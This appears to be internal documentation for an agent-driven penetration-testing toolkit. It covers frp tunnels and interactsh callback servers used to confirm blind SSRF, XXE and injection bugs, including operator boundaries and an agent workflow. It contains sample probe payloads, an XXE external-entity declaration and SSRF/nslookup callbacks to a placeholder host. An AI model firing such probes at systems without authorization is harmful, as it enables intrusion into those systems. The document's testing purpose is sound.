# FRP Tunneling & OOB Callbacks

## Overview

frp exposes local runtime services to remote targets. interactsh records out-of-band callbacks
for blind SSRF, XXE, command injection, SQLi, Log4Shell-style probes, and similar tests.

FRP tunnels, listeners, and OOB callback servers are **operator-controlled shared
infrastructure**. Agents must not start, stop, restart, or reconfigure shared
`frpc` / `oob-server` sessions because those sessions are global runtime state.

Agents do their own OOB readiness checks and per-agent client handling through
`vigil`. This keeps routine status/log checks out of the operator loop while
preserving the operator boundary for shared infrastructure and secrets.

Traffic path:

```text
Internet -> Caddy/TLS -> frps -> frpc in vigil -> interactsh or local listener
Internet -> frps TCP/UDP port -> frpc in vigil -> local runtime service
```

DNS is the primary OOB signal because most blind vulnerabilities resolve DNS before attempting
HTTP. HTTP callbacks are useful when target egress allows them, but DNS hits are usually the
earliest proof.

## One-Time External Prerequisites

DNS and the frp server are outside the local CLI:

- Delegate the OOB zone with an NS record such as `oob NS researcher.example`.
- Keep wildcard HTTP routing for the frp HTTP domain, such as `*.researcher.example`.
- Allow the frps bind port, OOB DNS UDP 53, HTTP/HTTPS, and any listener ports on the server
  security group.

Store the frp token in `vigil config`, not tracked docs — secrets in version control are a leak vector.

## Local Configuration

Configure once per workstation or install:

```bash
vigil config set oob.frp_host researcher.example
vigil config set oob.frp_port 7000
vigil config set oob.domain researcher.example
vigil config set oob.frp_token <token>
```

Defaults exist for host, port, and OOB domain, but `oob.frp_token` is required. Environment
variables override config when needed:

```bash
VIGIL_FRP_HOST
VIGIL_FRP_PORT
VIGIL_FRP_TOKEN
VIGIL_OOB_DOMAIN
```

## Starting Shared OOB Infrastructure

Start or verify the shared frp/interactsh sessions:

```bash
vigil oob start
vigil oob status --json
```

`vigil oob start` is idempotent. It renders runtime config under `/data/oob/`, starts missing tmux
sessions, and does nothing destructive when the existing sessions are healthy.

Runtime sessions:

| Session | Purpose |
|---------|---------|
| `frpc` | Shared frp tunnels |
| `oob-server` | interactsh-server watcher |
| `oob-client-<name>` | Per-agent or per-engagement interactsh-client |

Logs:

| Path | Source | Purpose |
|------|--------|---------|
| `/data/oob/frpc.log` | frpc | Tunnel registration and reconnect events |
| `/data/oob/watch.log` | server watcher | frp IP changes and interactsh restarts |
| `/data/oob/server.log` | interactsh-server | Raw callback stream; noisy |
| `/data/oob/clients/<name>.log` | interactsh-client | Raw per-client callback tail (read by `vigil oob client logs`); infra debug only — nonce<->probe correlation is `vigil oob poll` |

Use centralized logs from the host:

```bash
vigil logs oob --lines 80
```

## Agent OOB Readiness Check

Before sending blind payloads, agents verify OOB state directly:

```bash
vigil oob status --json
vigil logs oob --lines 80
```

Interpretation:

| Check | Ready signal | Agent action |
|-------|--------------|--------------|
| `server` | `true` | interactsh-server is available for callbacks |
| `frpc` | `true` | FRP tunnel registration is active |
| `clients` | contains your named client | the listener is up; `vigil oob poll --client <name>` can correlate hits |

If `server` or `frpc` is false, inspect `vigil logs oob --lines 80` and record a
runtime issue in your handoff. Escalate to the operator only for shared
infrastructure, token, DNS, or authentication failures because those are
operator-owned controls.

## Per-Agent Clients

Start one named client per agent/task that needs to run the listener. Agents
can manage these client sessions because they are correlation handles, not shared
FRP/server infrastructure:

```bash
vigil engagement list --json
vigil oob client start vuln-ssrf-api --engagement <engagement-key> --agent vulnerability-analyst
```

Do NOT read the callback URL out of the client log. Mint a nonce-tagged callback
URL per payload — the nonce is the correlation token — and use its full `http`
host in payloads:

```bash
vigil oob mint --technique ssrf --target-url <url> --param <p>
# → http  http://<nonce>.oob.example.com/
```

Examples (substitute the minted `<nonce>.oob.example.com` host):

```text
http://<nonce>.oob.example.com/ssrf-users-endpoint
nslookup <nonce>.oob.example.com
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<nonce>.oob.example.com/xxe">]>
```

Then correlate with `vigil oob poll --client vuln-ssrf-api`, which matches each
recorded probe to its callback. `vigil oob client logs vuln-ssrf-api --lines 80`
is only a raw tail of this client's listener log for infra debugging — it does
not correlate nonces to probes.

List and stop clients:

```bash
vigil oob client list
vigil oob client stop vuln-ssrf-api
```

## Validation

Run a smoke test after starting OOB:

```bash
vigil oob test
```

For manual validation:

```bash
dig test123.oob.example.com @8.8.8.8
curl http://test123.oob.example.com/
vigil logs oob --lines 40
```

Use `vigil oob poll --client <name>` for vulnerability confirmation (nonce<->probe correlation); client logs and raw server logs are for infrastructure debugging only.

## Agent Workflow

Agents should:

1. Run `vigil oob status --json` and confirm `server=true`, `frpc=true`, and the expected `domain`.
2. Start or reuse a named client with an explicit engagement key: `vigil engagement list --json`, `vigil oob client list`, then `vigil oob client start <name> --engagement <engagement-key> --agent <agent-name>`. The client runs the listener; it is not where you read the URL or the hits.
3. Mint a nonce-tagged callback URL per payload with `vigil oob mint --technique <t> --target-url <url> [--param <p>]`, and embed its `http` host in the payload (the nonce is the correlation token).
4. After firing, correlate probe<->callback with `vigil oob poll --client <name>` — it prints `matched <N> unmatched <M>` then one line per hit carrying the technique + target you minted with. Add `--json` to capture the matched set as evidence.
5. `vigil oob client logs <name> --lines 80` and `vigil logs oob --lines 80` are raw listener-log tails — use them only when debugging shared server/FRP health, never for correlation.

If OOB is unavailable, agents should fall back to time-based detection and state that OOB proof was
not available.

## Notes

- DNS uses UDP. The frp DNS proxy must stay UDP port 53.
- HTTP tunnels go through Caddy/TLS and frps HTTP routing.
- TCP/UDP tunnels bypass Caddy and bind direct ports on frps.
- Proxy names must be globally unique across active frpc clients; `vigil oob start` prefixes names
  with the runtime container hostname.
- `/data/oob/` persists through the runtime data volume.
